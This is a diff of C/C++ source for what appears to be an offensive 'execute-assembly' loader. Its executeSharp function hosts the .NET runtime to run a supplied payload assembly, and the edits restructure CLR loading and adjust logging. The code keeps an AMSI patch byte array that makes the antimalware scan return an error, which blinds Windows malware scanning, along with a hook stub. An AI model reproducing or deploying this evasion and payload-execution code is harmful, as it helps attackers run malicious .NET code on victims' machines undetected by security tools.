@@ -32,13 +32,12 @@ unsigned char uHook[] = {
 	0xFF, 0xE0
 };
 
-#ifdef _X32
-unsigned char amsipatch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };
-SIZE_T patchsize = 8;
-#endif
-#ifdef _X64
+#ifdef _WIN64
 unsigned char amsipatch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
 SIZE_T patchsize = 6;
+#else // _WIN32
+unsigned char amsipatch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };
+SIZE_T patchsize = 8;
 #endif
 
 union PARAMSIZE {
@@ -138,6 +137,7 @@ int executeSharp(LPVOID lpPayload)
 	{
 		clrVersion = L"v2.0.50727";
 	}
+	//wprintf(L"clr version:%s\n", clrVersion);
 
 	hr = SafeArrayUnaccessData(pSafeArray);
 
@@ -158,50 +158,83 @@ int executeSharp(LPVOID lpPayload)
 		}
 	}
 
-	hr = CLRCreateInstance(CLSID_CLRMetaHost, IID_ICLRMetaHost, (VOID**)&pMetaHost);
-
-	if(FAILED(hr))
+	BOOL isloaded = false;
+	try
 	{
-		printf("CLRCreateInstance failed w/hr 0x%08lx\n", hr);
-		return -1;
+		hr = CLRCreateInstance(CLSID_CLRMetaHost, IID_ICLRMetaHost, (VOID**)&pMetaHost);
+
+		if (SUCCEEDED(hr))
+		{
+			IEnumUnknown* pEnumerator;
+			HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, GetCurrentProcessId());
+			hr = pMetaHost->EnumerateLoadedRuntimes(hProcess, &pEnumerator);
+
+			//if (FAILED(hr))
+			//{
+			//	printf("Cannot enumerate loaded runtime w/hr 0x%08lx\n", hr);
+			//	return -1;
+			//}
+
+			if (SUCCEEDED(hr))
+			{
+				isloaded = ClrIsLoaded(clrVersion, pEnumerator, (VOID**)&pRuntimeInfo);
+
+				if (!isloaded)
+				{
+					hr = pMetaHost->GetRuntime(clrVersion, IID_ICLRRuntimeInfo, (VOID**)&pRuntimeInfo);
+
+					//if (FAILED(hr))
+					//{
+					//	wprintf(L"Cannot get the required CLR version (%s) w/hr 0x%08lx\n", clrVersion, hr);
+					//	return -1;
+					//}
+
+					if (SUCCEEDED(hr))
+					{
+						hr = pRuntimeInfo->IsLoadable(&bLoadable);
+
+						//if (FAILED(hr) || !bLoadable)
+						//{
+						//	wprintf(L"Cannot load the required CLR version (%s) w/hr 0x%08lx\n", clrVersion, hr);
+						//	return -1;
+						//}
+					}
+				}
+
+				if (isloaded || (SUCCEEDED(hr) && bLoadable))
+				{
+					hr = pRuntimeInfo->GetInterface(CLSID_CorRuntimeHost, IID_ICorRuntimeHost, (VOID**)&pRuntimeHost);
+
+
+					//if (FAILED(hr))
+					//{
+					//	printf("ICLRRuntimeInfo::GetInterface failed w/hr 0x%08lx\n", hr);
+					//	return -1;
+					//}
+				}
+			}
+		}
+	}
+	catch (...)
+	{
+		hr = E_FAIL;
 	}
 
-	IEnumUnknown* pEnumerator;
-	HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, GetCurrentProcessId());
-	hr = pMetaHost->EnumerateLoadedRuntimes(hProcess, &pEnumerator);
+	try
+	{
+		if (FAILED(hr))
+		{
+			hr = CorBindToRuntime(NULL, NULL, CLSID_CorRuntimeHost, IID_ICorRuntimeHost, (VOID**)&pRuntimeHost);
+		}
+	}
+	catch (...)
+	{
+		hr = E_FAIL;
+	}
 
 	if (FAILED(hr))
 	{
-		printf("Cannot enumerate loaded runtime w/hr 0x%08lx\n", hr);
-		return -1;
-	}
-	
-	BOOL isloaded = ClrIsLoaded(clrVersion, pEnumerator, (VOID**)&pRuntimeInfo);
-
-	if(!isloaded)
-	{
-		hr = pMetaHost->GetRuntime(clrVersion, IID_ICLRRuntimeInfo, (VOID**)&pRuntimeInfo);
-
-		if (FAILED(hr))
-		{
-			wprintf(L"Cannot get the required CLR version (%s) w/hr 0x%08lx\n", clrVersion, hr);
-			return -1;
-		}
-
-		hr = pRuntimeInfo->IsLoadable(&bLoadable);
-
-		if (FAILED(hr) || !bLoadable)
-		{
-			wprintf(L"Cannot load the required CLR version (%s) w/hr 0x%08lx\n", clrVersion, hr);
-			return -1;
-		}
-	}
-
-	hr = pRuntimeInfo->GetInterface(CLSID_CorRuntimeHost, IID_ICorRuntimeHost, (VOID**)&pRuntimeHost);
-
-	if(FAILED(hr))
-	{
-		printf("ICLRRuntimeInfo::GetInterface failed w/hr 0x%08lx\n", hr);
+		printf("Get Runtime failed w/hr 0x%08lx\n", hr);
 		return -1;
 	}
 
@@ -304,7 +337,7 @@ int executeSharp(LPVOID lpPayload)
 	else
 	{
 		//if no parameters set cEleemnt to 0
-		psaStaticMethodArgs = SafeArrayCreateVector(VT_VARIANT, 0, 0);
+		psaStaticMethodArgs = SafeArrayCreateVector(VT_VARIANT, 0, 1);
 	}
 	
 	//Assembly execution
@@ -316,7 +349,7 @@ int executeSharp(LPVOID lpPayload)
 		return -1;
 	}
 
-	wprintf(L"Succeeded\n");
+	wprintf(L"\nExecute Assembly Succeeded\n");
 	
 	return 0;
 }
